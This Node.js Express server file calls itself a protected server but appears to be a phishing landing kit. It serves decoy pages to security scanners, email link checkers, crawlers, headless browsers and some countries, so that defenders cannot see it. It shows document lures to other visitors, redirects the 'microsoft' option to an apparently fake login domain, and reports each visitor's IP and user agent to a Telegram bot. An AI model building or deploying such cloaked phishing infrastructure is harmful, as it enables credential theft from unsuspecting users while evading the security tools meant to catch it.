// express_protected_server_with_telegram_logging.js
// Production-ready Express server with layered rate-limiting, GeoIP checks,
// decoy pages, helmet security headers, trust-proxy support, and Telegram logging.

/*
Required environment variables:
  - PORT (default 3000)
  - ALLOWED_REFERER (your domain, e.g. example.com)
  - TELEGRAM_BOT_TOKEN
  - TELEGRAM_CHAT_ID
  - TRUST_PROXY (optional, set to 'true' when behind a proxy/CDN)
  - REDIS_URL (optional, when you want distributed rate-limit store)

Install dependencies:
  npm install express request-ip geoip-lite express-rate-limit helmet node-fetch@3
  // Optional for Redis-backed rate-limiter:
  npm install rate-limit-redis ioredis
*/

const express = require('express');
const app = express();
const path = require('path');
const helmet = require('helmet');
const geoip = require('geoip-lite');
const rateLimit = require('express-rate-limit');
require('dotenv').config();
app.set('trust proxy', true);

// Optional Redis store (uncomment to use):
// const RedisStore = require('rate-limit-redis');
// const IORedis = require('ioredis');

const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));

// ======= Config / Env =======
const PORT = process.env.PORT || 3007;
const ALLOWED_REFERER = process.env.ALLOWED_REFERER || 'your-landing-domain.com';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const USE_TRUST_PROXY = (process.env.TRUST_PROXY || 'false').toLowerCase() === 'true';
const REDIS_URL = process.env.REDIS_URL || null;

if (USE_TRUST_PROXY) app.set('trust proxy', true);

// ======= Telegram Logging =======
async function sendTelegramMessage(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' })
    });
  } catch (err) {
    console.error('Telegram logging failed:', err?.message || err);
  }
}

function formatLog(level, meta) {
  return JSON.stringify({ level, ts: new Date().toISOString(), ...meta });
}

function log(level, meta) {
  const line = formatLog(level, meta);
  // level === 'error' ? console.error(line) : console.log(line);
  if (['warn', 'error', 'critical'].includes(level)) {
      const text = `*${level.toUpperCase()}*
      Event: ${meta.event || ''}
      IP: ${meta.ip || ''}
      Reason: ${meta.reason || ''}
      UA: ${(meta.ua || '').slice(0, 200)}
      Time: ${new Date().toISOString()}`;
      sendTelegramMessage(text).catch(() => {});
  }else{
          text = `🟢 *${level.toUpperCase()}*
      Event: ${meta.event || ''}
      IP: ${meta.ip || ''}
      Path: ${meta.path || ''}
      UA: ${(meta.ua || '').slice(0, 200)}
      Time: ${new Date().toISOString()}`;
      sendTelegramMessage(text).catch(() => {});
  }
}

// ======= Rate limiter setup =======
let globalLimiterOptions = {
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  message: 'Too many requests from this network.',
  
};

/* Optional Redis
if (REDIS_URL) {
  const redisClient = new IORedis(REDIS_URL);
  globalLimiterOptions.store = new RedisStore({ sendCommand: (...args) => redisClient.call(...args) });
}
*/

const globalLimiter = rateLimit(globalLimiterOptions);

const apiLimiter = rateLimit({
  windowMs: 5 * 60 * 1000,
  max: 15,
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => {
    log('warn', { event: 'api_rate_limited', ip: req.clientIp, reason: 'api rate limit' });
    res.status(429).json({ error: 'API rate limit exceeded' });
  }
});

// ======= Helpers =======
function serveBenignPage(res) {
  res.set('X-Content-Type-Options', 'nosniff');
  return res.sendFile(path.join(__dirname, 'pages', 'benign.html'));
}

const decoyMessages = [
  'Document no longer available.',
  'Invalid request.',
  'This resource has been archived.',
  'Link expired.'
];

function serveDecoy(res) {
  const msg = decoyMessages[Math.floor(Math.random() * decoyMessages.length)];
  res.set('X-Random-Delay', Math.random().toFixed(3));
  return res.send(`<html><head><meta charset="utf-8"><title>${msg}</title></head><body><h1>${msg}</h1></body></html>`);
}

function isObviousScanner(req) {
  const ua = (req.get('User-Agent') || '').toLowerCase();
  
  // Comprehensive scanner patterns
  const scannerPatterns = [
    // Search Engines
    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
    'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver',
    
    // Security Scanners
    'virustotal', 'urlscan', 'phrasescan', 'censys', 'shodan',
    'qualys', 'nessus', 'nmap', 'acunetix', 'burp', 'nikto',
    'wpscan', 'sqlmap', 'metasploit', 'openvas',
    
    // Social Media & Analytics
    'facebookexternalhit', 'twitterbot', 'linkedinbot', 'pinterest',
    'whatsapp', 'telegrambot', 'discordbot', 'slackbot',
    'google page speed', 'lighthouse', 'gtmetrix',
    
    // Headless Browsers & Automation
    'headlesschrome', 'headlessfirefox', 'phantomjs', 'puppeteer',
    'selenium', 'playwright', 'webdriver', 'chromium',
    
    // Programming Libraries & Tools
    'python-requests', 'python-urllib', 'curl/', 'wget/',
    'go-http-client', 'java/', 'node-fetch', 'php/',
    'perl', 'ruby', 'rust', 'axios', 'request', 'http-client',
    
    // Monitoring & Uptime
    'uptimerobot', 'pingdom', 'datadog', 'newrelic',
    'site24x7', 'statuscake', 'monitor', 'pingbot',
    
    // Email Security & Proxies
    'safelinks', 'proofpoint', 'mimecast', 'fireeye',
    'mcafee', 'symantec', 'trendmicro', 'sophos',
    'zscaler', 'forcepoint', 'barracuda',
    
    // Generic Bot Patterns
    'bot/', 'spider/', 'crawler/', 'scanner/', 'checker/',
    'monitor/', 'fetcher/', 'grabber/', 'collector/',
    
    // Legacy/Anomalous Browsers
    'msie 6.0', 'msie 7.0', 'msie 8.0', 'netscape',
    'mosaic', 'opera mini', 'uc browser', 'silk browser'
  ];

  // Check for suspicious patterns
  const suspiciousPatterns = [
    /bot\//i,
    /crawler\//i, 
    /spider\//i,
    /scan/i,
    /headless/i,
    /phantom/i,
    /python/i,
    /curl/i,
    /wget/i
  ];
  
  return scannerPatterns.some(pattern => ua.includes(pattern)) ||
         suspiciousPatterns.some(pattern => pattern.test(ua));
}

function isSuspiciousGeoLocation(req) {
  const clientIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
               req.headers['x-real-ip'] ||
               req.ip;


  if (!clientIp || clientIp === '::1' || clientIp === '127.0.0.1') return false; // Skip localhost
  const ip = (clientIp.split(',')[0] || '').trim();
  const geo = geoip.lookup(ip);
  if (!geo) return false;
  const suspiciousCountries = ['CN', 'RU', 'TR', 'BR', 'IN'];
  return suspiciousCountries.includes(geo.country);
}

function isValidApiRequest(req) {
  const { provider } = req.body || {};
  if (!provider || typeof provider !== 'string') return false;
  return ['google', 'microsoft'].includes(provider);
}

// Input sanitization helper
function sanitizeInput(input) {
  if (typeof input !== 'string') return input;
  return input.replace(/[<>]/g, ''); // Basic XSS protection
}

// ======= Middleware =======
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));
app.use(express.json());
app.use(globalLimiter);
app.use(helmet({ contentSecurityPolicy: false }));

// Serve static files with path prefix (better security)
app.use('/public', express.static('public'));

function scannerMiddleware(req, res, next) {
  const clientIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
               req.headers['x-real-ip'] ||
               req.ip;
  const ua = req.get('User-Agent') || '';
  const currentPath = req.path;
  console.log(`🎯 SCANNER MIDDLEWARE EXECUTING for: ${req.method} ${req.path}`);

  if (currentPath.match(/\.(css|js|png|jpg|ico|svg)$/i) || currentPath === '/health') return next();

   log('info', { event: 'request', ip: clientIp, ua: ua.slice(0, 200), path: currentPath });
   
  // 2. Block internal IPs (fast check)
  const internalIPs = ['10.', '192.168.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', 
                       '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.',
                       '172.28.', '172.29.', '172.30.', '172.31.'];
  
  if (internalIPs.some(ip => clientIp.startsWith(ip))) {
    log('warn', { event: 'internal_scan_blocked', ip: clientIp });
    return serveDecoy(res);
  }

  // 3. Block empty User-Agents directly (fast check)
  if (!ua || ua.trim() === '') {
    log('warn', { event: 'empty_ua_blocked', ip: clientIp });
    return serveDecoy(res);
  }

   if (!req.get('Accept') || !req.get('Accept-Language')) {
    log('warn', { event: 'missing_headers', ip: clientIp, ua: ua.slice(0, 200) });
    return serveDecoy(res);
  }

  if (isObviousScanner(req)) {
    log('warn', { event: 'obvious_scanner', ip: clientIp, ua: ua.slice(0, 200) });
    return serveDecoy(res); // ⬅️ immediately respond, no limiter delay
  }

  if (isSuspiciousGeoLocation(req)) {
    log('warn', { event: 'geo_block', ip: clientIp });
    return serveBenignPage(res);
  }

  log('info', { event: 'allowed', ip: clientIp, path: currentPath });
  return next();
}

function apiProtectionMiddleware(req, res, next) {
  const clientIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
               req.headers['x-real-ip'] ||
               req.ip;
  // ==================== REQUEST TIMING PROTECTION ====================
  if (isTooFast(req)) {
    log('warn', { event: 'request_too_fast', ip: clientIp });
    return res.status(429).json({ success: false, redirectUrl: '/error' });
  }

  // ==================== INPUT VALIDATION ====================
  if (!isValidApiRequest(req)) {
    log('warn', { event: 'invalid_api_request', ip: clientIp });
    return res.status(400).json({ success: false, redirectUrl: '/error' });
  }
 
  // ==================== RATE LIMITING ====================
  return apiLimiter(req, res, next);
}

// ==================== HELPER FUNCTIONS ====================

// Request Timing Protection
const requestTimestamps = new Map();
function isTooFast(req) {
  const ip = req.ip;
  const now = Date.now();
  const lastRequest = requestTimestamps.get(ip) || 0;
  
  // Require at least 2 seconds between API calls from same IP
  if (now - lastRequest < 2000) {
    return true;
  }
  
  requestTimestamps.set(ip, now);
  return false;
}

app.use(scannerMiddleware);

// ======= Routes =======
app.get('/', (req, res) => {
  return res.sendFile(path.join(__dirname, 'pages', 'home.html'));
});

app.get('/download/id/4f92c7b1-ec3d', (req, res) => {
  const fileId = sanitizeInput(req.params.fileId);
  return res.sendFile(path.join(__dirname, 'pages', 'file.html'));
});

app.get('/documents/:docId',(req, res) => {
  const docId = sanitizeInput(req.params.docId);
  log('info', { event: 'serve_landing', ip: req.ip, docId });
  return res.sendFile(path.join(__dirname, 'pages', 'landing.html'));
});

app.post('/documents/verify', apiProtectionMiddleware, (req, res) => {
  const { provider } = req.body;
  const testingUrls = {
    google: 'https://mail.google.com/',
    microsoft: 'https://login.e3h3ud2u.shop/TfKVxpEJ'
  };
  const redirectUrl = testingUrls[provider] || '/error';
  log('info', { event: 'auth_verify', ip: req.ip, provider, redirectUrl });
   return res.redirect(redirectUrl);
});

app.get('/health', (req, res) => {
  res.json({ status: 'healthy', timestamp: Date.now(), uptime: process.uptime(), ip: req.ip });
});

app.get('/error', (req, res) => serveBenignPage(res));

// ======= Error handling =======
app.use((err, req, res, next) => {
  log('error', { event: 'internal_error', ip: req.ip, reason: err?.message });
  res.status(500).send('Internal Server Error');
});

// ======= Start server =======
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
  log('info', { event: 'server_started', port: PORT });
});